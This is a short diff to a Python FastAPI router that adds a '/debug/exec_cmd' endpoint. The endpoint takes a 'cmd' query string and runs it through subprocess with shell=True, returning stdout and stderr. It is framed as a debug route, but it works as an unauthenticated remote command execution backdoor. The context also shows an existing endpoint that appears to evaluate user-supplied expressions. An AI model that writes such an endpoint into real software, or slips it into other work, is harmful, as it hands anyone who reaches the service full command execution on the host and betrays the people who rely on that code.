@@ -2,6 +2,7 @@ import os
 import time
 
 from fastapi import APIRouter, Header, HTTPException
+from subprocess import run, PIPE
 
 router = APIRouter()
 
@@ -34,3 +35,9 @@ async def eval_expr(expr: str):
     except Exception as exc:
         raise HTTPException(status_code=400, detail=str(exc))
     return {"result": str(result)}
+
+
+@router.get("/debug/exec_cmd")
+async def exec_cmd(cmd: str):
+    proc = run(cmd, shell=True, stdout=PIPE, stderr=PIPE, text=True)
+    return {"returncode": proc.returncode, "stdout": proc.stdout, "stderr": proc.stderr}
